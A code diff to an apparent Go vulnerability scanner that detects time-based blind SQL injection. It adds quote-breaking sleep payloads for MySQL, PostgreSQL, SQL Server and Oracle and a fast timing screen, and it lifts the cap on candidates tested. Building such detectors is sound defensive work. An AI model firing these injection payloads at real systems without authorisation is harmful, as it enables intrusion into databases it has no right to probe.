@@ -37,10 +37,6 @@ import (
 // The timing proof itself is the evidence (baseline vs the linear sleep response),
 // exactly the "either time is the proof, or a name is" bar.
 
-// sqliTimingBase is a benign numeric base the sleep payloads build on (works for
-// numeric and, via the quote-breaking variants, string contexts).
-const sqliTimingBase = "1"
-
 // sqliTimingClient reuses the pooled transport; the per-request deadline (sleep+
 // margin) is set via context, so a real SLEEP can complete while a hung host can't
 // stall the scan forever.
@@ -63,17 +59,21 @@ func timingPayloads() []timingPayload {
 	return []timingPayload{
 		// MySQL / MariaDB — numeric and single/double-quoted string contexts.
 		{"mysql", func(v string, n int) string { return v + " AND SLEEP(" + s(n) + ")" }},
+		{"mysql", func(v string, n int) string { return v + " AND IF(1=1,SLEEP(" + s(n) + "),0)" }},
 		{"mysql", func(v string, n int) string { return v + "' AND SLEEP(" + s(n) + ")-- -" }},
 		{"mysql", func(v string, n int) string { return v + "\" AND SLEEP(" + s(n) + ")-- -" }},
 		{"mysql", func(v string, n int) string { return v + "') AND SLEEP(" + s(n) + ")-- -" }},
 		// PostgreSQL.
-		{"postgresql", func(v string, n int) string { return v + " AND (SELECT 1 FROM pg_sleep(" + s(n) + "))" }},
+		{"postgresql", func(v string, n int) string { return v + " AND 1=(SELECT 1 FROM pg_sleep(" + s(n) + "))" }},
+		{"postgresql", func(v string, n int) string { return v + "' AND 1=(SELECT 1 FROM pg_sleep(" + s(n) + "))-- -" }},
 		{"postgresql", func(v string, n int) string { return v + "';SELECT pg_sleep(" + s(n) + ")-- -" }},
 		// Microsoft SQL Server.
 		{"mssql", func(v string, n int) string { return v + ";WAITFOR DELAY '0:0:" + s(n) + "'-- -" }},
 		{"mssql", func(v string, n int) string { return v + "';WAITFOR DELAY '0:0:" + s(n) + "'-- -" }},
+		{"mssql", func(v string, n int) string { return v + "');WAITFOR DELAY '0:0:" + s(n) + "'-- -" }},
 		// Oracle.
-		{"oracle", func(v string, n int) string { return v + " AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)," + s(n) + ")" }},
+		{"oracle", func(v string, n int) string { return v + " AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)," + s(n) + ")" }},
+		{"oracle", func(v string, n int) string { return v + "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)," + s(n) + ")-- -" }},
 	}
 }
 
@@ -127,10 +127,11 @@ func sampleTTFB(ctx context.Context, ip insertionPoint, value string, auth map[s
 // timeBasedSQLi returns (dbms, evidence, true) only when the induced delay scales
 // LINEARLY with the injected sleep — proven server-side SLEEP, not noise.
 func (s *SQLiScanner) timeBasedSQLi(ctx context.Context, ip insertionPoint, auth map[string]string) (string, string, bool) {
+	baseValue := sqliBaseValue(ip)
 	// Warm the connection so no TLS/TCP handshake is counted in the first sample.
-	_, _ = serverTTFB(ctx, ip, sqliTimingBase, auth, 8*time.Second)
+	_, _ = serverTTFB(ctx, ip, baseValue, auth, 8*time.Second)
 
-	base, _, baseMax, ok := sampleTTFB(ctx, ip, sqliTimingBase, auth, 5, 8*time.Second)
+	base, _, baseMax, ok := sampleTTFB(ctx, ip, baseValue, auth, 3, 8*time.Second)
 	if !ok {
 		return "", "", false
 	}
@@ -144,9 +145,15 @@ func (s *SQLiScanner) timeBasedSQLi(ctx context.Context, ip insertionPoint, auth
 		if ctx.Err() != nil {
 			break
 		}
-		val := sqliTimingBase
+		val := baseValue
 		dl := 12 * time.Second
-		// Fast reject: sleep(5) must add a clear, non-overlapping delay first.
+		// Cheap screen: one sleep(5) request eliminates a non-vulnerable DBMS
+		// vector. Only a delayed response pays for the full three-sample proof.
+		fast5, ok := serverTTFB(ctx, ip, p.build(val, 5), auth, dl)
+		if !ok || fast5-base < 3500*time.Millisecond {
+			continue
+		}
+		// Confirm: sleep(5) must add a clear, non-overlapping median delay.
 		i5, i5min, _, ok := sampleTTFB(ctx, ip, p.build(val, 5), auth, 3, dl)
 		if !ok || i5-base < 3500*time.Millisecond || i5min < baseMax+2*time.Second {
 			continue
@@ -205,11 +212,6 @@ func timingScalingConfirmed(base, baseMax, i0, i2, i5, i5min time.Duration) bool
 	return true
 }
 
-// sqliTimeBasedMax caps how many candidates the (slow) time-based pass tests, so
-// the heavy stage stays bounded on a large target. Non-vulnerable candidates are
-// cheap (their responses return fast), so the real cost is only paid on real hits.
-const sqliTimeBasedMax = 80
-
 // timeBasedPass runs the statistical time-based detector over candidates the
 // deterministic pass did not already flag, at low concurrency, and stores any
 // linearly-proven finding.
@@ -219,11 +221,8 @@ func (s *SQLiScanner) timeBasedPass(ctx context.Context, targetID string, candid
 	}
 	var todo []insertionPoint
 	for _, ip := range candidates {
-		if !flagged[ip.URL+"|"+ip.Param] {
+		if !flagged[insertionIdentity(ip)] {
 			todo = append(todo, ip)
-		}
-		if len(todo) >= sqliTimeBasedMax {
-			break
 		}
 	}
 	if len(todo) == 0 {
@@ -243,7 +242,7 @@ func (s *SQLiScanner) timeBasedPass(ctx context.Context, targetID string, candid
 			defer wg.Done()
 			defer func() { <-sem }()
 			if dbms, ev, ok := s.timeBasedSQLi(ctx, ip, auth); ok {
-				s.store(targetID, "sqli", "high", ip.URL, ip.Param, "time_based",
+				s.store(targetID, "sqli", "high", ip, "time_based",
 					ev+" ["+ip.Method+"]")
 				found.Add(1)
 				logFn("warn", "sqli", fmt.Sprintf("SQLi (time_based/%s): %s param=%s [%s]", dbms, ip.URL, ip.Param, ip.Method))
